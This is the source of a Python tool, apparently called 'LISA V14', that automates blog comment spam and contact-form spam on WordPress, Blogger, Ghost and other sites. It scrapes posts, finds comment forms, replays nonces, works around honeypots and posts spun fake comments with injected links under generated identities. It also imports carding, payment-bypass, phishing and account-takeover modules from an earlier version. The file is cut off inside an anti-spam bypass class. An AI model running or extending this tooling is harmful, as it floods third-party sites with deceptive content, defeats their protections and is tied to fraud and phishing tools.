#!/usr/bin/env python3
"""
LISA V14 EXEC — "SPAM PROTOCOL" — THE BLOG HORDE
AI-Driven Autonomous Blog Spam & Exploitation Engine — V14

V12 FRAUD (6 fraud modules) + V14 SPAM modules:

  NEW IN V14 (SPAM PROTOCOL):
  1.  BlogHunter        — Discover blog posts, CMS detection, comment forms,
                          RSS/sitemap scraping, post extraction
  2.  CommentSpammer    — Auto-post comments with spun content + link injection,
                          name/email gen, WordPress/Blogger/Ghost/Grav support
  3.  ContactFormSpammer— Auto-detect contact forms (CF7, WPForms, Gravity, generic),
                          auto-fill, honeypot detection, proxy rotation
  4.  AntiSpamBypass    — Detect Akismet, reCAPTCHA, moderation queues,
                          honeypot fields, nonce extraction & replay

USAGE:
  python3 lisa_v8_exec_v14.py target.com                        # Full autonomous
  python3 lisa_v8_exec_v14.py target.com --focus blog           # Blog spam focus
  python3 lisa_v8_exec_v14.py target.com --spam-count 50        # 50 comments
  python3 lisa_v8_exec_v14.py target.com --link "https://mysite.com"  # Inject link
  python3 lisa_v8_exec_v14.py target.com --spam-mode aggressive # Aggressive mode
  python3 lisa_v8_exec_v14.py -t t1.com t2.com t3.com          # Batch mode
"""

import sys, os, json, re, time, random, string, subprocess, hashlib, base64
import urllib.parse
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, "/home/ubuntu")

from lisa_v8_exec_v12 import (
    FraudBeastEngine, BeastXEngine, BeastEngine, TLSEngine, WordPressAssault,
    LeakHunter, VHostPanelHunter, ZimbraExploit, MassAssignment,
    ProxyRotator, CI3Assault, BatchRunner, StateManager,
    CookieForge, AffiliateFraud, CardingEngine, PaymentBypass,
    PhishingForge, AccountTakeover,
    PROXY, CFFI_OK, V12_SIGNATURE,
)
try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    pass

V14_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V14 — SPAM PROTOCOL — THE BLOG HORDE                       ║
║  Fraud engine + 4 Spam Modules + Blog Hunter                     ║
║  \"Spam the web. Own the SERPs. Cash out.\"                        ║
╚══════════════════════════════════════════════════════════════════╝
"""

STATE_DIR = "/home/ubuntu/.lisa_v14_state"
REPORT_DIR = "/home/ubuntu/.lisa_v14_reports"
SPAM_PROMPT_FILE = "/home/ubuntu/lisa-v14-spam.md"

# ═══════════════════════════════════════════════════════
# SPINTAX ENGINE
# ═══════════════════════════════════════════════════════
SPINTAX_COMMENTS = [
    # Positive/generic
    "Great {article|post|read|write-up|content}! {Really|Very|Super} {helpful|informative|useful|insightful}. {Thanks for sharing|Keep it up|Appreciate this}.",
    "{This|That} {article|post} {really|truly|absolutely} {helped|assisted|aided} me {a lot|so much|tremendously}. {I've been looking for|I needed|I was searching for} {this|this info|this kind of content}.",
    "{Awesome|Amazing|Fantastic|Excellent|Wonderful} {article|post|content}! {I learned|I gained|I picked up} {so much|a lot|a ton} from {this|reading this|it}. {Keep writing|Keep posting|More please}!",
    "{I've|I have} {been following|been reading|bookmarked} your {blog|site|content} for {a while|some time|a bit} now. {This post|This article|This one} is {one of your best|really good|excellent}. {Well done|Great job|Kudos}!",
    # Problem-solving
    "{I was|I've been} {struggling with|having issues with|trying to solve} {this exact|this same|a similar} {problem|issue|question}. {Your|The} {solution|explanation|guide} {worked|helped|fixed it} {perfectly|really well|like a charm}.",
    "{Finally|At last|Thank goodness} {someone|somebody|a blog} {explains|covers|addresses} {this|this topic|this subject} {clearly|properly|well}. {Most|Other|Many} {articles|posts|blogs} {just|simply} {don't|do not} {get it|cover it|explain it}.",
    # Bridge to link
    "{I also|I recently|I just} {found|discovered|came across|stumbled upon} {this|a|this great} {resource|site|tool|guide} {that|which} {complements|adds to|goes well with} {this|your article|this topic}: {link}",
    "{By the way|On a related note|Speaking of|Also}, {check out|take a look at|you might like|I recommend} {link} — {it's|it is} {really|super|very} {helpful|useful|relevant} {for|to|if you're into} {this|this topic|this stuff}.",
    "{For|If you need|If you're looking for} {more|additional|further} {info|information|resources|reading} on {this|this topic|this subject}, {I'd|I would} {recommend|suggest|point you to} {link}.",
    # Question-based
    "{Great|Nice|Good|Interesting} {points|thoughts|insights}! {Have you|Do you|You might want to} {also|also check out|also look at} {link}? {It covers|It explains|It goes into} {similar|related|complementary} {topics|stuff|material}.",
    "{This|Your article|This post} {reminded me of|made me think of|got me thinking about} {link}. {It's|It is} {a|another|a similar} {good|great|useful} {resource|read|guide} on {the topic|this|the subject}.",
    # Short
    "{Nice|Good|Great} {article|post|read}! {Check out|Also see|Related:} {link}",
    "{Thanks for|Appreciate|Love} {this|the post|the article}! {BTW|P.S.|Also:} {link}",
]

SPINTAX_NAMES = [
    "{John|James|Robert|Michael|David|William|Richard|Joseph|Thomas|Christopher}",
    "{Mary|Patricia|Jennifer|Linda|Barbara|Elizabeth|Susan|Jessica|Sarah|Karen}",
    "{Alex|Jordan|Taylor|Casey|Morgan|Riley|Jamie|Avery|Quinn|Skyler}",
    "{Tech|Digital|Web|Cyber|Net|Code|Data|Dev|Cloud|SEO}",
    "{Blogger|Reader|Fan|Enthusiast|Expert|Pro|Guru|Geek|Nerd|Hacker}",
    "{Marketing|Content|Growth|Product|Brand|Media|Social|SEO|Traffic|Sales}",
]

SPINTAX_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
    "proton.me", "mail.com", "yandex.com", "gmx.com",
]

# ═══════════════════════════════════════════════════════
# V14 MODULE 1: BLOG HUNTER
# ═══════════════════════════════════════════════════════
class BlogHunter:
    """Discover blog posts, CMS detection, comment forms, RSS/sitemap scraping."""

    # Known blog platforms and their detection patterns
    BLOG_PLATFORMS = {
        "WORDPRESS": {
            "paths": ["/wp-json/", "/wp-content/", "/wp-admin/", "/wp-login.php"],
            "meta": ["generator.*?WordPress", "wp-content"],
            "comment_form": "/wp-comments-post.php",
            "api_posts": "/wp-json/wp/v2/posts?per_page=100",
            "api_pages": "/wp-json/wp/v2/pages?per_page=100",
            "rss": "/feed/",
            "sitemap": "/wp-sitemap.xml",
        },
        "BLOGGER": {
            "paths": ["/feeds/posts/default", "/search?updated-max"],
            "meta": ["blogger", "blogspot", "blogger-template"],
            "comment_form": "/comment.do",
            "rss": "/feeds/posts/default?alt=rss&max-results=50",
            "sitemap": "/sitemap.xml",
        },
        "GHOST": {
            "paths": ["/ghost/", "/content/images/"],
            "meta": ["ghost", "Ghost"],
            "comment_form": "/members/api/comments/",
            "api_posts": "/ghost/api/v3/content/posts/?key={key}&limit=50",
            "rss": "/rss/",
            "sitemap": "/sitemap.xml",
        },
        "MEDIUM": {
            "paths": [],
            "meta": ["medium.com", "Medium"],
            "comment_form": None,  # Medium uses responses, not traditional comments
            "rss": "/feed/",
        },
        "GRAV": {
            "paths": ["/user/", "/admin/"],
            "meta": ["GravCMS", "grav"],
            "comment_form": None,
            "rss": "/feed.rss",
        },
        "JOOMLA": {
            "paths": ["/index.php?option=com_content", "/administrator/"],
            "meta": ["Joomla", "joomla"],
            "comment_form": "/index.php?option=com_jcomments",
            "rss": "/index.php?option=com_content&view=featured&format=feed",
        },
        "DRUPAL": {
            "paths": ["/node/", "/user/login"],
            "meta": ["Drupal", "drupal"],
            "comment_form": "/comment/reply/",
            "rss": "/rss.xml",
        },
        "GENERIC": {
            "paths": ["/blog/", "/articles/", "/posts/", "/news/"],
            "meta": [],
            "comment_form": None,
            "rss": "/rss.xml",
            "sitemap": "/sitemap.xml",
        },
    }

    @staticmethod
    def detect_platform(base: str, sess=None) -> str:
        """Detect what blog platform the target uses."""
        if sess is None:
            try:
                sess = cffi_requests.Session()
                sess.get(base + "/", impersonate="safari17_0", timeout=15)
            except Exception:
                try:
                    sess = cffi_requests.Session()
                    sess.get(base + "/", impersonate="chrome120", timeout=15)
                except Exception:
                    return "UNKNOWN"

        try:
            r = sess.get(base + "/", timeout=15)
            html = r.text.lower()
            headers = {k.lower(): v for k, v in r.headers.items()}

            # Check by HTML content
            for platform, config in BlogHunter.BLOG_PLATFORMS.items():
                if platform == "GENERIC":
                    continue
                for pattern in config["meta"]:
                    if re.search(pattern, html, re.IGNORECASE):
                        return platform

            # Check by paths
            for platform, config in BlogHunter.BLOG_PLATFORMS.items():
                if platform == "GENERIC":
                    continue
                for path in config["paths"][:2]:
                    try:
                        test = sess.get(base + path, timeout=8)
                        if test.status_code == 200:
                            # WordPress: check for wp-json
                            if platform == "WORDPRESS" and "wp-json" in path:
                                return "WORDPRESS"
                            if platform == "BLOGGER":
                                if "blogger" in test.text.lower() or "blogspot" in test.text.lower():
                                    return "BLOGGER"
                            if platform == "GHOST" and "ghost" in test.text.lower():
                                return "GHOST"
                    except Exception:
                        continue

            # Check for generic blog indicators
            blog_indicators = ["/blog", "article", "post", "comment", "tag", "category", "archive"]
            score = sum(1 for ind in blog_indicators if ind in html)
            if score >= 3:
                return "GENERIC_BLOG"

            return "UNKNOWN"
        except Exception:
            return "UNKNOWN"

    @staticmethod
    def extract_posts(platform: str, base: str, sess=None, limit=50) -> List[Dict]:
        """Extract post URLs and metadata from the target."""
        if sess is None:
            try:
                sess = cffi_requests.Session()
            except Exception:
                return []

        posts = []
        config = BlogHunter.BLOG_PLATFORMS.get(platform, BlogHunter.BLOG_PLATFORMS["GENERIC"])

        # WordPress REST API
        if platform == "WORDPRESS":
            try:
                api_url = base + config["api_posts"]
                r = sess.get(api_url, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list):
                        for p in data[:limit]:
                            posts.append({
                                "title": p.get("title", {}).get("rendered", ""),
                                "url": p.get("link", ""),
                                "id": p.get("id", 0),
                                "date": p.get("date", ""),
                                "slug": p.get("slug", ""),
                                "comment_status": p.get("comment_status", "closed"),
                                "source": "wp-api",
                            })
            except Exception:
                pass

        # RSS fallback
        if not posts and config.get("rss"):
            posts = BlogHunter._extract_from_rss(base + config["rss"], sess, limit)

        # Sitemap fallback
        if not posts and config.get("sitemap"):
            posts = BlogHunter._extract_from_sitemap(base + config["sitemap"], sess, limit)

        # HTML scraping fallback
        if not posts:
            posts = BlogHunter._extract_from_html(base, sess, limit)

        return posts[:limit]

    @staticmethod
    def _extract_from_rss(rss_url: str, sess, limit=50) -> List[Dict]:
        """Extract posts from RSS/Atom feed."""
        posts = []
        try:
            r = sess.get(rss_url, timeout=15)
            if r.status_code == 200:
                # Atom: <entry><link href="..." /><title>...</title></entry>
                entries = re.findall(
                    r'<entry>.*?<link\s+(?:rel="alternate"\s+)?href="([^"]+)".*?<title[^>]*>(.*?)</title>.*?</entry>',
                    r.text, re.DOTALL | re.IGNORECASE
                )
                for url, title in entries[:limit]:
                    posts.append({
                        "title": BlogHunter._clean_html(title),
                        "url": url,
                        "source": "rss-atom",
                    })

                # RSS 2.0: <item><link>...</link><title>...</title></item>
                if not posts:
                    items = re.findall(
                        r'<item>.*?<link>(.*?)</link>.*?<title>(.*?)</title>.*?</item>',
                        r.text, re.DOTALL | re.IGNORECASE
                    )
                    for url, title in items[:limit]:
                        posts.append({
                            "title": BlogHunter._clean_html(title),
                            "url": url,
                            "source": "rss",
                        })
        except Exception:
            pass
        return posts

    @staticmethod
    def _extract_from_sitemap(sitemap_url: str, sess, limit=50) -> List[Dict]:
        """Extract blog posts from XML sitemap."""
        posts = []
        try:
            r = sess.get(sitemap_url, timeout=15)
            if r.status_code == 200:
                # WordPress sitemap
                urls = re.findall(r'<loc>(.*?)</loc>', r.text)
                # Filter for likely blog posts (not pages, categories, tags)
                for url in urls[:limit * 2]:
                    if any(kw in url.lower() for kw in ['/blog/', '/article/', '/post/', '/202', '/news/']):
                        posts.append({
                            "title": url.split("/")[-1].replace("-", " ").title(),
                            "url": url,
                            "source": "sitemap",
                        })
                if len(posts) > limit:
                    posts = posts[:limit]
        except Exception:
            pass
        return posts

    @staticmethod
    def _extract_from_html(base: str, sess, limit=50) -> List[Dict]:
        """Extract blog posts from HTML scraping."""
        posts = []
        try:
            r = sess.get(base + "/", timeout=15)
            html = r.text

            # Common blog patterns
            patterns = [
                r'<a[^>]+href="([^"]*/(?:blog|article|post|news|20\d{2})/[^"]*)"[^>]*>([^<]+)</a>',
                r'<h[23][^>]*><a[^>]+href="([^"]+)"[^>]*>([^<]+)</a></h[23]>',
                r'<a[^>]+class="[^"]*(?:entry-title|post-title|article-title|blog-title)[^"]*"[^>]+href="([^"]+)"[^>]*>([^<]+)</a>',
            ]

            seen = set()
            for pattern in patterns:
                for url, title in re.findall(pattern, html, re.IGNORECASE):
                    if url in seen:
                        continue
                    seen.add(url)
                    if not url.startswith("http"):
                        url = base.rstrip("/") + "/" + url.lstrip("/")
                    posts.append({
                        "title": BlogHunter._clean_html(title).strip(),
                        "url": url,
                        "source": "html-scrape",
                    })
                    if len(posts) >= limit:
                        break
                if len(posts) >= limit:
                    break
        except Exception:
            pass
        return posts

    @staticmethod
    def find_comment_form(platform: str, post_url: str, sess) -> Optional[Dict]:
        """Find the comment form on a post page."""
        try:
            r = sess.get(post_url, timeout=15)
            if r.status_code != 200:
                return None
            html = r.text

            result = {"url": post_url, "platform": platform, "form_action": None,
                      "fields": {}, "nonce": None, "nonce_name": None,
                      "honeypots": [], "captcha": False, "akismet": False}

            config = BlogHunter.BLOG_PLATFORMS.get(platform, BlogHunter.BLOG_PLATFORMS["GENERIC"])

            # WordPress
            if platform == "WORDPRESS":
                result["form_action"] = base_from_url(post_url) + "/wp-comments-post.php"

                # Find comment_post_ID
                post_id = re.search(r'name="comment_post_ID"\s+value="(\d+)"', html)
                if post_id:
                    result["fields"]["comment_post_ID"] = post_id.group(1)

                # Find comment_parent
                result["fields"]["comment_parent"] = "0"

                # Nonce
                nonce = re.search(r'name="([^"]*nonce[^"]*)"\s+value="([^"]+)"', html, re.IGNORECASE)
                if nonce:
                    result["nonce_name"] = nonce.group(1)
                    result["nonce"] = nonce.group(2)

                # Akismet
                if "akismet_comment_nonce" in html:
                    result["akismet"] = True
                    ak_nonce = re.search(r'name="akismet_comment_nonce"\s+value="([^"]+)"', html)
                    if ak_nonce:
                        result["fields"]["akismet_comment_nonce"] = ak_nonce.group(1)

            # Blogger
            elif platform == "BLOGGER":
                blog_id = re.search(r"blogID['\"]?\s*[:=]\s*['\"]?(\d+)", html)
                if blog_id:
                    result["fields"]["blogID"] = blog_id.group(1)
                result["form_action"] = post_url.rstrip("/") + "/comment.do"

            # Generic form detection
            if not result["form_action"]:
                form = re.search(
                    r'<form[^>]+(?:id|class)=["\'][^"\']*comment[^"\']*["\'][^>]*action=["\']([^"\']+)["\']',
                    html, re.IGNORECASE
                )
                if form:
                    result["form_action"] = form.group(1)
                    if not result["form_action"].startswith("http"):
                        result["form_action"] = base_from_url(post_url) + "/" + result["form_action"].lstrip("/")

            # Honeypot detection
            hp_patterns = [
                r'<input[^>]+(?:name|id)=["\'](?:website|url|hp_[^"\']*|honeypot[^"\']*|fax[^"\']*|phone[^"\']*)["\'][^>]*>',
                r'<input[^>]+(?:class|style)=["\'].*?(?:hidden|display:\s*none|visibility:\s*hidden).*?["\'][^>]*>',
            ]
            for pattern in hp_patterns:
                for match in re.finditer(pattern, html, re.IGNORECASE):
                    name = re.search(r'name=["\']([^"\']+)["\']', match.group())
                    if name:
                        result["honeypots"].append(name.group(1))

            # Captcha detection
            captcha_indicators = [
                "g-recaptcha", "recaptcha/api.js", "h-captcha", "hcaptcha.com",
                "turnstile", "cloudflare.com/cdn-cgi/challenge",
                "captcha", "altcha",
            ]
            for ci in captcha_indicators:
                if ci in html.lower():
                    result["captcha"] = True
                    break

            # Find comment-specific input fields
            input_fields = re.findall(
                r'<(?:input|textarea)[^>]+name=["\']([^"\']*(?:author|name|email|url|comment|body|message|subject|website)[^"\']*)["\'][^>]*>',
                html, re.IGNORECASE
            )
            for field in input_fields:
                if field not in result["fields"]:
                    result["fields"][field] = ""

            return result
        except Exception:
            return None

    @staticmethod
    def _clean_html(text: str) -> str:
        """Strip HTML tags and decode entities."""
        text = re.sub(r'<[^>]+>', '', text)
        text = text.replace("&#8211;", "–").replace("&#8212;", "—")
        text = text.replace("&#8216;", "'").replace("&#8217;", "'")
        text = text.replace("&#8220;", '"').replace("&#8221;", '"')
        text = text.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
        text = text.replace("&quot;", '"').replace("&#039;", "'")
        text = text.replace("&nbsp;", " ")
        return text.strip()


# ═══════════════════════════════════════════════════════
# V14 MODULE 2: COMMENT SPAMMER
# ═══════════════════════════════════════════════════════
class CommentSpammer:
    """Auto-post comments with spun content + link injection."""

    @staticmethod
    def generate_name() -> str:
        """Generate a realistic-looking name."""
        parts = random.choice(SPINTAX_NAMES)
        # Unspin - simple approach
        if "{" in parts:
            options = re.findall(r'\{([^}]+)\}', parts)
            for opt in options:
                choices = opt.split("|")
                parts = parts.replace("{" + opt + "}", random.choice(choices), 1)
        # Add random suffix
        if random.random() < 0.3:
            parts += str(random.randint(1, 999))
        return parts

    @staticmethod
    def generate_email(name: str) -> str:
        """Generate email from name."""
        clean = name.lower().replace(" ", "").replace("'", "").replace("-", "")
        if random.random() < 0.5:
            clean += str(random.randint(1, 999))
        domain = random.choice(SPINTAX_DOMAINS)
        return f"{clean}@{domain}"

    @staticmethod
    def generate_url(name: str) -> str:
        """Generate a fake website URL."""
        clean = name.lower().replace(" ", "").replace("'", "").replace("-", "")
        tlds = [".com", ".net", ".org", ".io", ".co", ".blog", ".site"]
        if random.random() < 0.5:
            return f"https://{clean}{random.choice(tlds)}"
        return ""

    @staticmethod
    def spin_comment(template: str, link: str = "") -> str:
        """Apply spintax to a comment template."""
        comment = template

        # Resolve spintax: {a|b|c} → random choice
        while "{" in comment:
            comment = re.sub(
                r'\{([^{}]+)\}',
                lambda m: random.choice(m.group(1).split("|")),
                comment
            )

        # Inject link
        if link and "{link}" in comment:
            comment = comment.replace("{link}", link)

        # Remove link placeholder if no link provided
        if "{link}" in comment:
            comment = re.sub(r'\s*\{link\}', '', comment)

        return comment

    @staticmethod
    def generate_comment_pool(count: int, link: str = "") -> List[str]:
        """Generate a pool of spun comments."""
        pool = []
        for _ in range(count):
            template = random.choice(SPINTAX_COMMENTS)
            comment = CommentSpammer.spin_comment(template, link)
            pool.append(comment)
        return pool

    @staticmethod
    def post_comment(
        form: Dict,
        author: str,
        email: str,
        url: str,
        comment: str,
        sess,
        delay: float = 2.0
    ) -> Dict:
        """Post a single comment to a blog."""
        result = {
            "success": False,
            "post_url": form["url"],
            "form_action": form.get("form_action"),
            "author": author,
            "comment": comment[:80],
            "error": None,
        }

        if not form.get("form_action"):
            result["error"] = "No form action"
            return result

        try:
            # Build the POST data
            data = {}

            # WordPress standard fields
            platform = form.get("platform", "GENERIC")
            if platform == "WORDPRESS":
                data["comment"] = comment
                data["author"] = author
                data["email"] = email
                data["url"] = url
                data["submit"] = "Post Comment"
                data["comment_post_ID"] = form.get("fields", {}).get("comment_post_ID", "0")
                data["comment_parent"] = "0"

                # Nonce
                if form.get("nonce_name"):
                    data[form["nonce_name"]] = form.get("nonce", "")

                # Akismet
                if "akismet_comment_nonce" in form.get("fields", {}):
                    data["akismet_comment_nonce"] = form["fields"]["akismet_comment_nonce"]

                # Honeypots: fill empty
                for hp in form.get("honeypots", []):
                    data[hp] = ""

            # Blogger
            elif platform == "BLOGGER":
                data["commentBody"] = comment
                data["blogID"] = form.get("fields", {}).get("blogID", "")
                data["authorName"] = author
                data["authorEmail"] = email

            # Generic
            else:
                data["comment"] = comment
                data["author"] = author
                data["name"] = author
                data["email"] = email
                data["url"] = url
                data["website"] = url
                data["body"] = comment
                data["message"] = comment
                data["content"] = comment
                data["subject"] = f"Re: {form.get('title', 'Great Post')}"

                # Honeypots: fill empty
                for hp in form.get("honeypots", []):
                    data[hp] = ""

            # Random delay
            time.sleep(random.uniform(delay * 0.5, delay * 1.5))

            # Headers
            headers = {
                "User-Agent": CookieForge.random_ua("random"),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": random.choice(CookieForge.ACCEPT_LANGUAGES),
                "Referer": form["url"],
                "Origin": base_from_url(form["url"]),
                "Content-Type": "application/x-www-form-urlencoded",
                "Cache-Control": "no-cache",
            }

            action = form["form_action"]
            if not action.startswith("http"):
                action = base_from_url(form["url"]) + "/" + action.lstrip("/")

            r = sess.post(
                action,
                data=data,
                headers=headers,
                timeout=20,
                allow_redirects=True,
            )

            result["status_code"] = r.status_code
            result["content_length"] = len(r.text)
            response_text = r.text.lower()

            # ═══ SMART DETECTION: Published vs Moderation vs Error ═══
            # WordPress patterns:
            #   PUBLISHED: 302 redirect to post#comment-XXXX, or page with comment visible
            #   MODERATION: 200 + Content-Length ~0 + WP cookie (expires: 1984)
            #   DUPLICATE: 200 + "Duplicate comment" in body
            #   ERROR: 200 + "Error:" or wp_die()

            is_published = False
            is_moderated = False
            is_duplicate = False
            is_error = False

            # 302 redirect = published
            if r.status_code == 302 or (hasattr(r, 'history') and r.history and r.history[0].status_code == 302):
                is_published = True

            # Check body for clear indicators
            if "duplicate comment" in response_text or "already posted" in response_text:
                is_duplicate = True
            elif "error:" in response_text or "wp_die" in response_text:
                is_error = True
            elif len(r.text) < 50:
                # Empty/short response = moderation (WP cookie set, no redirect)
                is_moderated = True
            elif "thank you for commenting" in response_text or "comment submitted" in response_text:
                # Some themes show a thank you page for moderated comments
                is_moderated = True
            elif "comment posted" in response_text or "your comment has been" in response_text:
                is_published = True
            elif "awaiting moderation" in response_text or "menunggu moderasi" in response_text:
                is_moderated = True
            elif r.status_code == 200 and len(r.text) < 200:
                # WP sends empty body for moderation
                is_moderated = True
            elif r.status_code == 200 and "comment-" in response_text and "comment-content" in response_text:
                is_published = True
            else:
                # Default: treat as moderated (WordPress silently holds)
                is_moderated = True

            if is_published:
                result["success"] = True
                result["status"] = "published"
            elif is_moderated:
                result["success"] = True  # Comment submitted, but held
                result["status"] = "moderated"
                result["error"] = "held for moderation"
            elif is_duplicate:
                result["success"] = False
                result["status"] = "duplicate"
                result["error"] = "Duplicate comment"
            elif is_error:
                result["success"] = False
                result["status"] = "error"
                result["error"] = f"Error response ({len(r.text)} bytes)"
            else:
                result["success"] = False
                result["status"] = "unknown"
                result["error"] = f"HTTP {r.status_code} ({len(r.text)} bytes)"

            return result

        except Exception as e:
            result["error"] = str(e)[:100]
            return result


# ═══════════════════════════════════════════════════════
# V14 MODULE 3: CONTACT FORM SPAMMER
# ═══════════════════════════════════════════════════════
class ContactFormSpammer:
    """Auto-detect and fill contact forms on any site."""

    # Known contact form plugins
    FORM_PATTERNS = {
        "CF7": {  # Contact Form 7 (WordPress)
            "detect": ["wpcf7", "contact-form-7", "wpcf7-form"],
            "form_action": "/wp-json/contact-form-7/v1/contact-forms/{id}/feedback",
            "fields": ["your-name", "your-email", "your-subject", "your-message"],
            "id_pattern": r'data-id=["\'](\d+)["\']',
        },
        "WPFORMS": {
            "detect": ["wpforms", "wpforms-form"],
            "form_action": None,  # Usually self-post
            "fields": ["wpforms[fields][0]", "wpforms[fields][1]", "wpforms[fields][3]"],
        },
        "GRAVITY": {
            "detect": ["gform", "gravityform", "gform_wrapper"],
            "form_action": None,
            "fields": ["input_1", "input_2", "input_3", "input_4"],
        },
        "NINJA": {
            "detect": ["ninja-forms", "nf-form"],
            "form_action": "/wp-json/ninja-forms/v1/submissions",
            "fields": [],
        },
        "GENERIC": {
            "detect": [],
            "form_action": None,
            "fields": ["name", "email", "subject", "message", "phone", "company"],
        },
    }

    @staticmethod
    def detect_forms(html: str, base_url: str) -> List[Dict]:
        """Detect all contact forms on a page."""
        forms = []

        # Find all form elements
        form_matches = re.finditer(
            r'<form[^>]*?action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html, re.DOTALL | re.IGNORECASE
        )

        for match in form_matches:
            action = match.group(1)
            form_html = match.group(2)
            full_form = match.group(0)

            form_info = {
                "action": action,
                "base_url": base_url,
                "fields": {},
                "plugin": "GENERIC",
                "has_captcha": False,
                "has_honeypot": False,
                "honeypots": [],
            }

            # Detect plugin
            for plugin, config in ContactFormSpammer.FORM_PATTERNS.items():
                if plugin == "GENERIC":
                    continue
                for pattern in config["detect"]:
                    if pattern in full_form.lower():
                        form_info["plugin"] = plugin
                        break
                if form_info["plugin"] != "GENERIC":
                    break

            # Extract form ID if CF7
            if form_info["plugin"] == "CF7":
                id_match = re.search(
                    ContactFormSpammer.FORM_PATTERNS["CF7"]["id_pattern"],
                    full_form
                )
                if id_match:
                    form_info["form_id"] = id_match.group(1)
                    form_info["action"] = f"/wp-json/contact-form-7/v1/contact-forms/{id_match.group(1)}/feedback"

            # Extract input fields
            input_fields = re.findall(
                r'<(?:input|textarea|select)[^>]+name=["\']([^"\']+)["\']',
                form_html, re.IGNORECASE
            )
            for field in input_fields:
                form_info["fields"][field] = ""

            # Detect honeypots
            for field_name in form_info["fields"]:
                if re.search(r'(?:website|url|hp_|honeypot|fax|hidden_field)', field_name, re.IGNORECASE):
                    form_info["has_honeypot"] = True
                    form_info["honeypots"].append(field_name)

            # Detect captcha
            captcha_indicators = [
                "g-recaptcha", "recaptcha", "h-captcha", "hcaptcha",
                "turnstile", "altcha", "captcha",
            ]
            for ci in captcha_indicators:
                if ci in full_form.lower():
                    form_info["has_captcha"] = True
                    break

            forms.append(form_info)

        return forms

    @staticmethod
    def generate_spam_message(topic: str = "", link: str = "") -> Dict[str, str]:
        """Generate spam content for a contact form."""
        name = CommentSpammer.generate_name()
        email = CommentSpammer.generate_email(name)

        subjects = [
            f"Question about your {topic or 'content'}",
            f"Collaboration opportunity",
            f"Quick question regarding your {topic or 'site'}",
            f"Partnership inquiry",
            f"Regarding {topic or 'your recent post'}",
            f"Business proposal",
            f"Guest post inquiry",
            f"Advertising opportunity",
        ]

        messages = [
            f"Hi there,\n\nI came across your {topic or 'site'} and wanted to reach out. "
            f"I think we could collaborate on something interesting. "
            f"{'Check out ' + link if link else 'Let me know if you are interested.'}\n\n"
            f"Best regards,\n{name}",

            f"Hello,\n\nI've been following your {topic or 'content'} for a while and have a "
            f"proposal that might interest you. "
            f"{'I recently launched ' + link + ' which complements what you do.' if link else 'Would love to discuss further.'}\n\n"
            f"Cheers,\n{name}",

            f"Dear site owner,\n\nI wanted to inquire about advertising opportunities on your "
            f"{topic or 'website'}. "
            f"{'I represent ' + link + ' and we are looking for quality placements.' if link else 'Please let me know your rates.'}\n\n"
            f"Thanks,\n{name}",
        ]

        return {
            "name": name,
            "email": email,
            "subject": random.choice(subjects),
            "message": random.choice(messages),
            "phone": f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}",
            "company": f"{name} {random.choice(['Consulting', 'Media', 'Digital', 'Group', 'Solutions', 'Lab', 'Co', 'Agency'])}",
        }

    @staticmethod
    def fill_form(form_info: Dict, spam_data: Dict) -> Dict[str, str]:
        """Auto-fill form fields with spam data."""
        filled = {}

        field_mapping = {
            "name": ["name", "your-name", "full_name", "fullname", "nama", "author"],
            "email": ["email", "your-email", "e-mail", "mail", "email_address"],
            "subject": ["subject", "your-subject", "title", "topic", "subjek", "judul"],
            "message": ["message", "your-message", "body", "content", "comment", "pesan", "isi"],
            "phone": ["phone", "tel", "telephone", "mobile", "hp", "no_telp", "no_hp"],
            "company": ["company", "organization", "business", "perusahaan", "instansi"],
            "website": ["website", "url", "site", "web", "blog"],
        }

        for field_name in form_info["fields"].keys():
            field_lower = field_name.lower()

            # Skip honeypots
            if field_name in form_info.get("honeypots", []):
                filled[field_name] = ""
                continue

            # Skip nonce/CSRF
            if re.search(r'(?:nonce|csrf|token|_wp)', field_lower):
                filled[field_name] = ""
                continue

            # Match to spam data
            matched = False
            for data_key, patterns in field_mapping.items():
                for pattern in patterns:
                    if pattern in field_lower:
                        filled[field_name] = spam_data.get(data_key, "")
                        matched = True
                        break
                if matched:
                    break

            if not matched:
                filled[field_name] = ""

        return filled

    @staticmethod
    def submit_form(
        form_info: Dict,
        spam_data: Dict,
        sess,
        delay: float = 3.0
    ) -> Dict:
        """Submit a filled contact form."""
        result = {
            "success": False,
            "form_action": form_info["action"],
            "plugin": form_info["plugin"],
            "error": None,
        }

        if form_info.get("has_captcha"):
            result["error"] = "Captcha-protected"
            return result

        try:
            filled = ContactFormSpammer.fill_form(form_info, spam_data)

            action = form_info["action"]
            if not action.startswith("http"):
                action = form_info["base_url"].rstrip("/") + "/" + action.lstrip("/")

            headers = {
                "User-Agent": CookieForge.random_ua("random"),
                "Accept": "application/json, text/html, */*",
                "Accept-Language": random.choice(CookieForge.ACCEPT_LANGUAGES),
                "Referer": form_info["base_url"],
                "Origin": base_from_url(form_info["base_url"]),
                "Content-Type": "application/x-www-form-urlencoded",
            }

            time.sleep(random.uniform(delay * 0.5, delay * 1.5))

            r = sess.post(action, data=filled, headers=headers, timeout=20, allow_redirects=True)

            result["status_code"] = r.status_code
            response_text = r.text.lower()

            success_indicators = [
                "thank", "success", "sent", "submitted", "received",
                "terima kasih", "berhasil", "terkirim", "sukses",
                "message sent", "form submitted", "we will get back",
            ]

            if r.status_code == 200 and any(ind in response_text for ind in success_indicators):
                result["success"] = True
            elif r.status_code in [200, 302]:
                result["success"] = True  # Assume success if no error

            return result

        except Exception as e:
            result["error"] = str(e)[:100]
            return result


# ═══════════════════════════════════════════════════════
# V14 MODULE 4: ANTI-SPAM BYPASS
# ═══════════════════════════════════════════════════════
class AntiSpamBypass:
    """Detect anti-spam systems and attempt bypasses."""

    @staticmethod
    def detect_antispam(html: str, headers: Dict = None) -> Dict:
        """Detect what anti-spam system is in use."""
        result = {
            "akismet": False,
            "captcha": False,
            "captcha_type": None,
            "honeypot": False,
            "honeypot_count": 0,
            "moderation": False,
            "nonce_required": False,
